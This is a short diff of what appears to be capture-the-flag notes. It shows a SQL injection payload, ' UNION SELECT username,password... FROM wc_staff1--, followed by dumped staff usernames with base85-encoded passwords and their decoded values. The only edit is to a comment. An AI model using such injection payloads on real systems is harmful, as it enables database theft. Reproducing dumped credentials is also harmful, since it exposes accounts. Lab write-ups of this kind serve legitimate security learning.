@@ -43,6 +43,6 @@ Mozilla/4.0 (compatible; MSIE 5.0; AOL 6.0; Windows 98; DigExt; YComp 5.0.2.5)
 ' UNION SELECT username,password,NULL,NULL,NULL FROM wc_staff1-- 
 
 # After dumping the table we got the below creds, and base85
-# decoded the passwords
+# decoded the passwords and got the last 2 flags
 sally.jane		3G*"^2DR7(BOYF,2Z	9fj3628fhbb37
 peter.hoffman		C1q4#Gr%E;2_m(.		jhfsy385720s
